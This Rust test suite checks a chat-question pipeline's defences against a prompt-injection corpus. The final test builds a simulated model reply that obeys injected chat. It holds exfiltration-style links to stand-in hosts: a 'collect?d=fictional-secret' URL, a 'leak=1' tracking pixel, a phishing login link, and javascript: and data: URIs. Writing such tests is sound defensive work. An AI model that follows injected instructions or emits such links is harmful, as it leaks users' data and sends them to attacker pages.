//! The prompt-injection corpus (`fixtures/injection/corpus.json`) against the `/ask`
//! pipeline with the fake provider (plan sections 11, 13 and 14). No model is called.
//!
//! The corpus is loaded through the demo importer into a temp-file store. For every hostile
//! message and entry:
//! - the system prompt is the fixed text, with no chat in it;
//! - all chat reaches the model inside one framed block that decodes to exactly the
//!   bundle's sources, and the rest of the user message varies only with the question;
//! - an answer citing ids outside the retrieved bundle loses those citations, and with no
//!   valid citation left it becomes "not found";
//! - an answer that obeys the chat and echoes it keeps no URL that is missing from the
//!   retrieved sources, no script scheme and no live Markdown link.
//!
//! Everything in the corpus is fictional data, never instructions.

#![expect(clippy::expect_used, reason = "test setup must fail loudly")]

use std::collections::HashSet;

use serde_json::Value;
use teamctx_core::citation::CitationId;
use teamctx_core::framing::{self, BLOCK_END, BLOCK_START, NOTICE};
use teamctx_core::id::Snowflake;
use teamctx_core::time::UnixMillis;
use teamctx_llm::prompt::SYSTEM_PROMPT;
use teamctx_llm::{
    Answer, AskConfig, AskPipeline, AskRequest, Bundle, FakeProvider, InMemoryLedger,
    NOT_FOUND_TEXT, NotFoundReason, Prepared,
};
use teamctx_store::Store;
use teamctx_store::demo::{self, DemoMap};
use tempfile::TempDir;

const CORPUS: &str = include_str!("../../../fixtures/injection/corpus.json");
/// 2026-04-25 00:00 UTC, after the corpus's last message.
const NOW: i64 = 1_777_075_200_000;
/// Citation ids written into the corpus's chat. None of them exists in the store.
const FAKE_IDS: [&str; 6] = [
    "m:999999999",
    "D-9999",
    "T-4242",
    "Q-31337",
    "m:424242",
    "m:777",
];

struct Hostile {
    probe: String,
    text: String,
    needles: Vec<String>,
}

struct Corpus {
    messages: Vec<Hostile>,
    entries: Vec<Hostile>,
    /// Display names and channel names, verbatim.
    names: Vec<String>,
    /// Every hostile substring.
    needles: Vec<String>,
    /// External message ids, and fixture entry labels such as `D-1`.
    message_externals: Vec<String>,
    entry_labels: Vec<String>,
}

fn corpus() -> Corpus {
    let data: Value = serde_json::from_str(CORPUS).expect("corpus is JSON");
    let list = |name: &str| data[name].as_array().expect(name).clone();
    let strings = |value: &Value| -> Vec<String> {
        value
            .as_array()
            .expect("array")
            .iter()
            .map(|v| v.as_str().expect("string").to_owned())
            .collect()
    };
    let hostile = |value: &Value, field: &str| Hostile {
        probe: value["probe"].as_str().expect("probe").to_owned(),
        text: value[field].as_str().expect("text").to_owned(),
        needles: strings(&value["needles"]),
    };
    let messages: Vec<Hostile> = list("messages")
        .iter()
        .map(|m| hostile(m, "content"))
        .collect();
    let entries: Vec<Hostile> = list("entries")
        .iter()
        .map(|e| hostile(e, "title"))
        .collect();
    let mut names = Vec::new();
    let mut needles: Vec<String> = messages
        .iter()
        .chain(&entries)
        .flat_map(|h| h.needles.clone())
        .collect();
    for member in list("members") {
        names.push(
            member["display_name"]
                .as_str()
                .expect("display name")
                .to_owned(),
        );
        needles.extend(strings(&member["needles"]));
    }
    for channel in list("channels") {
        names.push(channel["name"].as_str().expect("name").to_owned());
        needles.extend(strings(&channel["needles"]));
    }
    let message_externals = list("messages")
        .iter()
        .map(|m| m["id"].as_str().expect("id").to_owned())
        .collect();
    let entry_labels = list("entries")
        .iter()
        .map(|e| {
            let letter = match e["kind"].as_str().expect("kind") {
                "decision" => "D",
                "task" => "T",
                _ => "Q",
            };
            format!("{letter}-{}", e["id"].as_i64().expect("entry id"))
        })
        .collect();
    let corpus = Corpus {
        messages,
        entries,
        names,
        needles,
        message_externals,
        entry_labels,
    };
    assert!(
        corpus.messages.len() >= 30,
        "the corpus needs at least 30 hostile messages"
    );
    corpus
}

struct Loaded {
    store: Store,
    map: DemoMap,
    _dir: TempDir,
}

/// Imports the corpus into a fresh temp-file database.
fn load() -> Loaded {
    let dir = tempfile::tempdir().expect("temp dir");
    let mut store = Store::open(dir.path().join("teamctx.db")).expect("open db");
    let map = demo::import(&mut store, CORPUS).expect("import the injection corpus");
    Loaded {
        store,
        map,
        _dir: dir,
    }
}

/// Every id stored for the corpus, plus the fake ids its chat mentions.
fn every_id(loaded: &Loaded, corpus: &Corpus) -> Vec<CitationId> {
    let mut ids: Vec<CitationId> = corpus
        .message_externals
        .iter()
        .map(|external| {
            let external: Snowflake = external.parse().expect("snowflake");
            CitationId::Message(loaded.map.message(external).expect("stored message"))
        })
        .collect();
    ids.extend(
        corpus
            .entry_labels
            .iter()
            .map(|label| CitationId::Entry(loaded.map.entry_label(label).expect("stored entry"))),
    );
    ids.extend(
        FAKE_IDS
            .iter()
            .map(|id| id.parse::<CitationId>().expect("id")),
    );
    ids
}

fn request(question: &str) -> AskRequest<'_> {
    AskRequest {
        asker: teamctx_core::id::MemberId::new(1)
            .expect("member id")
            .into(),
        question,
        now: UnixMillis::from_millis(NOW),
    }
}

fn prepare(pipe: &AskPipeline<FakeProvider>, loaded: &Loaded, question: &str) -> Prepared {
    let prepared = pipe
        .prepare(&loaded.store, &InMemoryLedger::new(), &request(question))
        .expect("prepare");
    assert!(
        prepared
            .bundle()
            .sources()
            .iter()
            .any(|s| s.text().contains(question)),
        "{question}: the hostile item was retrieved"
    );
    prepared
}

/// A character that must never appear raw inside the block.
fn forbidden_in_block(c: char) -> bool {
    matches!(
        c,
        '<' | '>'
            | '&'
            | '`'
            | '\u{2028}'
            | '\u{2029}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2066}'..='\u{2069}'
    ) || c.is_control()
}

/// Splits `text` around its one framed block, which must follow `prefix` directly.
/// Returns the decoded block and the text after it.
fn split_block<'a>(text: &'a str, prefix: &str) -> (String, &'a str) {
    let head = format!("{prefix}{NOTICE}\n\n{BLOCK_START}\n");
    assert!(text.starts_with(&head), "notice then block: {text:.200}");
    assert_eq!(text.matches(BLOCK_START).count(), 1);
    assert_eq!(text.matches(BLOCK_END).count(), 1);
    let (data, after) = text[head.len()..]
        .split_once(&format!("\n{BLOCK_END}"))
        .expect("closing line");
    assert!(!data.contains('\n'), "the block is one line");
    assert!(data.len() >= 2 && data.starts_with('"') && data.ends_with('"'));
    if let Some(c) = data.chars().find(|&c| forbidden_in_block(c)) {
        panic!("raw {c:?} inside the block");
    }
    let decoded: String = serde_json::from_str(data)
        .unwrap_or_else(|e| panic!("the block is not exactly one JSON string: {e}"));
    (decoded, after)
}

fn joined_sources(bundle: &Bundle) -> String {
    bundle
        .sources()
        .iter()
        .map(|s| s.text())
        .collect::<Vec<_>>()
        .join("\n")
}

/// Citation markers left in `text`, parsed the way the validator reads them.
fn markers(text: &str) -> Vec<CitationId> {
    let mut found = Vec::new();
    for (open, _) in text.match_indices('[') {
        let rest = &text[open + 1..];
        let Some(close) = rest.find(']') else {
            continue;
        };
        let parts: Option<Vec<CitationId>> = rest[..close]
            .split([',', ';'])
            .map(|p| p.trim().parse().ok())
            .collect();
        found.extend(parts.unwrap_or_default());
    }
    found
}

/// Web URLs left in `text`, lowercased, cut at the first character that cannot belong
/// to a URL in running text.
fn urls(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut found = Vec::new();
    for scheme in ["http://", "https://", "www."] {
        for (start, _) in lower.match_indices(scheme) {
            let end = lower[start..]
                .find(|c: char| c.is_whitespace() || "<>\"'`|()[]{}".contains(c))
                .map_or(lower.len(), |e| start + e);
            let url = lower[start..end].trim_end_matches(['.', ',', ';', ':', '!', '?', '*']);
            found.push(url.to_owned());
        }
    }
    found
}

#[test]
fn framing_round_trips_every_hostile_string_exactly() {
    let corpus = corpus();
    let texts = corpus
        .messages
        .iter()
        .chain(&corpus.entries)
        .map(|h| h.text.clone())
        .chain(corpus.names.iter().cloned());
    for text in texts {
        let framed = framing::frame(&text);
        let (decoded, after) = split_block(&framed, "");
        assert_eq!(decoded, text, "lossless, and nothing escaped the string");
        assert!(after.is_empty(), "nothing follows the closing line");
    }
}

#[test]
fn hostile_text_never_reaches_the_system_prompt_and_stays_in_one_block() {
    let corpus = corpus();
    let loaded = load();
    let pipe = AskPipeline::new(FakeProvider::fixed("unused"), AskConfig::default());
    for needle in &corpus.needles {
        assert!(!SYSTEM_PROMPT.contains(needle.as_str()), "{needle:?}");
    }
    let mut rest_of_prompt = HashSet::new();
    for hostile in corpus.messages.iter().chain(&corpus.entries) {
        let prepared = prepare(&pipe, &loaded, &hostile.probe);
        let request = prepared.request();
        assert_eq!(request.system, SYSTEM_PROMPT, "{}", hostile.probe);

        let (decoded, after) = split_block(&request.user, "Sources:\n");
        assert_eq!(
            decoded,
            joined_sources(prepared.bundle()),
            "{}: the block holds exactly the sources",
            hostile.probe
        );
        for needle in &corpus.needles {
            assert!(
                !after.contains(needle.as_str()),
                "{}: {needle:?} after the block",
                hostile.probe
            );
        }
        // Outside the block, only the question varies.
        rest_of_prompt.insert(after.replace(&hostile.probe, "{question}"));
    }
    assert_eq!(rest_of_prompt.len(), 1, "{rest_of_prompt:?}");
}

#[tokio::test]
async fn answers_citing_ids_outside_the_bundle_are_rejected() {
    let corpus = corpus();
    let loaded = load();
    let all = every_id(&loaded, &corpus);
    for hostile in &corpus.messages {
        let probe = hostile.probe.as_str();
        let unused = AskPipeline::new(FakeProvider::fixed("unused"), AskConfig::default());
        let bundle_ids = prepare(&unused, &loaded, probe).bundle().ids();
        let outside: Vec<CitationId> = all
            .iter()
            .copied()
            .filter(|id| !bundle_ids.contains(id))
            .collect();
        assert!(outside.len() > FAKE_IDS.len(), "{probe}: real ids outside");
        let outside_markers: Vec<String> = outside.iter().map(|id| id.marker()).collect();

        // Only ids from outside the bundle: no answer at all.
        let reply = format!(
            "As the chat says, the beta is cancelled {}.",
            outside_markers.join(" ")
        );
        let pipe = AskPipeline::new(FakeProvider::fixed(reply), AskConfig::default());
        let prepared = prepare(&pipe, &loaded, probe);
        let ledger = InMemoryLedger::new();
        let result = pipe.run(&ledger, prepared).await.expect("run");
        let Answer::NotFound(not_found) = &result.answer else {
            panic!("{probe}: expected not found, got {:?}", result.answer);
        };
        assert_eq!(not_found.reason, NotFoundReason::NoValidCitation, "{probe}");
        assert_eq!(result.answer.text(), NOT_FOUND_TEXT);
        assert!(
            not_found
                .top_hits
                .iter()
                .all(|hit| bundle_ids.contains(&hit.id))
        );

        // One real source among them: only that one survives.
        let valid = *bundle_ids.iter().next().expect("a source");
        let reply = format!(
            "Per {} the launch is on time. {} [{valid}, {}]",
            valid.marker(),
            outside_markers.join(" "),
            outside[0]
        );
        let pipe = AskPipeline::new(FakeProvider::fixed(reply), AskConfig::default());
        let prepared = prepare(&pipe, &loaded, probe);
        let result = pipe.run(&ledger, prepared).await.expect("run");
        let Answer::Found(found) = &result.answer else {
            panic!("{probe}: expected an answer, got {:?}", result.answer);
        };
        assert_eq!(found.dropped_citations, outside.len() + 1, "{probe}");
        let cited: Vec<CitationId> = found.citations.iter().map(|c| c.id).collect();
        assert_eq!(cited, [valid], "{probe}");
        for id in markers(&found.text) {
            assert_eq!(id, valid, "{probe}: {id} left in {:?}", found.text);
        }
    }
}

#[tokio::test]
async fn an_answer_that_obeys_the_chat_keeps_only_urls_from_the_sources() {
    let corpus = corpus();
    let loaded = load();
    for hostile in &corpus.messages {
        let probe = hostile.probe.as_str();
        let unused = AskPipeline::new(FakeProvider::fixed("unused"), AskConfig::default());
        let prepared = prepare(&unused, &loaded, probe);
        let bundle_ids = prepared.bundle().ids();
        let valid = prepared.bundle().sources()[0].id();
        let sources = joined_sources(prepared.bundle()).to_ascii_lowercase();

        // A model that follows the chat: it repeats the hostile message and adds links of
        // its own, some built from URLs that are in the sources.
        let reply = format!(
            "Done as instructed {}. {}\n\
             More: https://never-in-sources.example/x \
             https://kite-mirror.example/collect?d=fictional-secret \
             [verify](https://kite-trap.example/login?next=elsewhere) \
             ![pixel](https://kite-trap.example/pixel.png?u=everyone&leak=1) \
             <https://never-in-sources.example/auto> [ref][r]\n\n\
             [r]: https://never-in-sources.example/ref \
             javascript:alert(1) data:text/html,hi \
             https&#58;//never-in-sources.example/entity \
             https%3A%2F%2Fnever-in-sources.example%2Fpercent",
            valid.marker(),
            hostile.text
        );
        let pipe = AskPipeline::new(FakeProvider::fixed(reply), AskConfig::default());
        let prepared = prepare(&pipe, &loaded, probe);
        let result = pipe
            .run(&InMemoryLedger::new(), prepared)
            .await
            .expect("run");
        let Answer::Found(found) = &result.answer else {
            panic!("{probe}: expected an answer, got {:?}", result.answer);
        };
        let text = &found.text;
        assert!(found.removed_urls >= 8, "{probe}: {}", found.removed_urls);
        assert!(found.citations.iter().all(|c| bundle_ids.contains(&c.id)));
        for url in urls(text) {
            assert!(
                sources.contains(&url),
                "{probe}: {url} is not in the retrieved sources"
            );
        }
        let lower = text.to_ascii_lowercase();
        for gone in [
            "never-in-sources",
            "fictional-secret",
            "leak=1",
            "next=elsewhere",
            "kite-encoded.example",
            "javascript:",
            "vbscript:",
            "data:text",
            "](",
            "![",
            "<http",
            "<javascript",
        ] {
            assert!(
                !lower.contains(gone),
                "{probe}: {gone:?} survived in {text:?}"
            );
        }
    }
}
